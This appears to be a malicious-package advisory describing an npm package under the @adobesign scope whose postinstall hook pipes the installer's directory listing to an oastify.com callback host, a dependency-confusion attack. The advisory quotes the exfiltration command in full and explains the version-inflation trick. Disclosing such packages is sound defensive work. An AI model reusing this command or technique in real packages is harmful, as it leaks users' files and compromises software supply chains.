summary: @adobesign/as-dev-tools postinstall exfiltrates directory listing to Burp Collaborator endpoint
details: The package's package.json declares a postinstall lifecycle script that runs `ls | curl -d @- https://o5u9v30a13fddwo3ey623df59wfn3er3.oastify.com`, piping the installer's current-working-directory file listing to an attacker-controlled oastify.com (Burp Collaborator) subdomain on every `npm install`. The package ships no functional code and uses the @adobesign scope with an implausibly high version (99.9.10), matching the dependency-confusion pattern intended to be resolved by internal Adobe builds ahead of a private-registry package of the same name. Installing the package causes automatic, unattended exfiltration of directory contents to an out-of-band callback host controlled by the publisher.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
